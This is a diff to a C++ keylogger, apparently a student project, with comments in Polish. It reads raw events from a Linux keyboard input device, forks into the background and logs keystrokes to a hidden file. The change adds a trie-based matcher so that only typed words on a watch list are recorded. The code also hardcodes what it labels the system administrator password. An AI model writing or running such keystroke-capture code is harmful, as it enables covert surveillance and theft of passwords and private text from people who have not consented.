@@ -10,17 +10,24 @@
 #include <mutex>
 #include <thread>
 #include <chrono>
+#include <vector>
+#include "tree.h"
+#include "treecheck.h"
 
-#define	event_path "/dev/input/event0" //event klawiatury (najpewniej 0, ale czasem też jest 3 lub inny, trzeba sprawdzić"
-#define pass_word  "tezcatlipoca"      //hasło administratora systemu
-#define data_file  "/home/quetz/.data" //ścieżka do pliku logów
-#define keys_file  "/home/quetz/.keys" //ścieżka do pliku z klawiszami (musi być ten co w repo)
+#define	event_path "/dev/input/event4" //event klawiatury (najpewniej 0, ale czasem też jest 3 lub inny, trzeba sprawdzić"
+#define pass_word  "monolit"      //hasło administratora systemu
+#define data_file  "/home/losiowaty/dev/UXP/KeyLogger/.data" //ścieżka do pliku logów
+#define keys_file  "/home/losiowaty/dev/UXP/KeyLogger/.keys" //ścieżka do pliku z klawiszami (musi być ten co w repo)
 
-char keys[242][20];
+char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',' ',' ',' ',' ','q','w','e','r','t','y','u','i','o','p','[',']',' ',' ','a','s','d','f', 'g','h','j','k','l',' ',' ',' ',' ',' ','z','x','c','v','b','n','m',',','.','/' };
 FILE *data;
 std::mutex mutex;
 
+Tree *tree;
+TreeCheck *checker;
+
 void printTime()
+
 {
 	time_t now;
 	char *t = (char *)malloc(100);
@@ -29,7 +36,7 @@ void printTime()
 	t[strlen(t) - 1] = '\0';
 
     mutex.lock();
-	fprintf(data, "\n%s : ", t);
+	fprintf(data, "%s : ", t);
 	fflush(data);
 	mutex.unlock();
 
@@ -44,24 +51,6 @@ void signal_heandle()
 	exit(0);
 }
 
-void readKeyFile()
-{
-	FILE *kf = fopen(keys_file, "r");
-	if(kf == NULL)
-	{
-		printTime();
-		fprintf(data, "ERROR : keys file missing\n");
-		exit(0);
-	}
-	char line[40];
-	int i;
-	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++)
-	{
-		line[strlen(line) - 1] = '\0';
-		strcpy(keys[i], line);
-	}
-	fclose(kf);
-}
 
 void stamper()
 {
@@ -124,9 +113,8 @@ void init()
 		printTime();
 		fprintf(data, "              << start of Keylogger session >>              \n");
 		fflush(data);
-		readKeyFile();
 
-		std::thread stamperThread(stamper);
+//		std::thread stamperThread(stamper);
 
         while (1)
         {
@@ -137,13 +125,23 @@ void init()
 
 			in = (struct input_event *)buff;
 
-			if(in -> value < 241)
+			if(in->value < 241)
 			{
 
-				mutex.lock();
-                fprintf(data, "%s ", keys[in->value]);
-                fflush(data);
-				mutex.unlock();
+				
+
+        if(checker->checkNextLetter(chars[in->value])){
+
+            if(checker->isCurrentNodeTerminal()) {
+	
+		printTime();
+		mutex.lock();
+		fprintf(data, "%s\n", checker->getFoundWord().c_str());
+		fflush(data);
+		mutex.unlock();
+		}
+        }
+				
 
 			}
 			free(buff);
@@ -154,6 +152,13 @@ void init()
 
 int main(void)
 {
+
+	std::vector<std::string> slowa;
+	slowa.push_back("Slowo");
+    	slowa.push_back("sal");
+    	slowa.push_back("sala");
+    	tree = new Tree(slowa);
+	checker = new TreeCheck(tree);
 
 	if(!fork())
 		init();
